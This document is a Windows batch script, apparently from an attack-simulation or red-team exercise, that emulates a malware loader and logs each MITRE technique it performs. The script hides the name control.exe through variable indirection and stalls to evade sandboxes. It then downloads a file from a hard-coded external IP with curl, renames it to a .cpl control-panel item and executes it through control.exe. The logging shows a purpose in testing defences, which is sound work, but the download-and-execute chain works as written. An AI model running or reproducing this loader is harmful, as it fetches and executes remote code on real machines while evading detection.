@echo off
SETLOCAL EnableDelayedExpansion

REM PHR placeholder assignments (random-named SET vars, one per PHR)
SET akjdh=%APPDATA%\50266\f8182fe2
SET vbnmc=ab6e6d3d.txt
SET zxmqp=https://3.144.153.50/test/stage/2/icon.png?QVVBQmk-R1dK
SET plkmj=BALAM-S2BO
SET qwert=QVVBQmk
SET asdfg=R1dK
SET zxcvb=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once at script start
SET tsvar=!DATE!/!TIME!

REM Derived variables for logging and paths
SET agentvar=!plkmj!
SET simidvar=!qwert!
SET logvar=!zxcvb!
SET out_dir=!akjdh!
SET out_file=!vbnmc!
SET heartbeat_url=!zxmqp!

REM Obfuscated LOLBIN references (T1027) – variable indirection
SET _part1=con
SET _part2=trol
SET _part3=.exe
SET ref1=_part1
SET ref2=_part2
SET ref3=_part3
CALL SET lolbin2=%%!ref1!%%%%!ref2!%%%%!ref3!%%
SET _lolbin=!lolbin2!

REM T1027 log – obfuscation setup complete
>> "!logvar!" (
  echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1027^|Obfuscated Files or Information=OK:
)
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: obfuscation_setup>> "!logvar!" 2>nul

REM ====== ANTI-SANDBOX DELAYS (T1497) ======
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: delay_start>> "!logvar!" 2>nul
timeout /t 10 /nobreak >nul
ping -n 3 127.0.0.1 >nul
for /l %%i in (1,1,2) do timeout /t 1 /nobreak >nul
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: delay_end>> "!logvar!" 2>nul

>> "!logvar!" (
  echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1497^|Virtualization/Sandbox Evasion=OK:
)

REM ====== HEARTBEAT FETCH (curl) ======
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o "!out_dir!\!out_file!" "!heartbeat_url!"
IF ERRORLEVEL 1 (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_failed>> "!logvar!" 2>nul
) ELSE (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_complete>> "!logvar!" 2>nul
)

timeout /t 5 /nobreak >nul

REM ====== CHANGE TO OUTPUT DIRECTORY ======
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_start>> "!logvar!" 2>nul
cd /d "!out_dir!" >nul 2>&1
IF ERRORLEVEL 1 (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_result=1>> "!logvar!" 2>nul
) ELSE (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_result=0>> "!logvar!" 2>nul
)

for /l %%i in (1,1,3) do timeout /t 1 /nobreak >nul

REM ====== RENAME DLL TO .CPL ======
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: rename_start>> "!logvar!" 2>nul
SET outfilepath=!out_dir!\!out_file!
FOR %%i IN ("!outfilepath!") DO SET base_cpl=%%~ni
ren "!outfilepath!" "!base_cpl!.cpl"
IF ERRORLEVEL 1 (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: rename_result=1>> "!logvar!" 2>nul
) ELSE (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: rename_result=0>> "!logvar!" 2>nul
)

SET /A rdelay2=%RANDOM% %% 10 + 5
timeout /t !rdelay2! /nobreak >nul

REM ====== EXECUTE VIA CONTROL.EXE (T1218) ======
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: controlexec_start>> "!logvar!" 2>nul
%_lolbin% "!out_dir!\!base_cpl!.cpl"
IF ERRORLEVEL 1 (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: controlexec_result=1>> "!logvar!" 2>nul
  >> "!logvar!" (
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=FAIL:control.exe_error
  )
) ELSE (
  echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: controlexec_result=0>> "!logvar!" 2>nul
  >> "!logvar!" (
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=OK:
  )
)

ENDLOCAL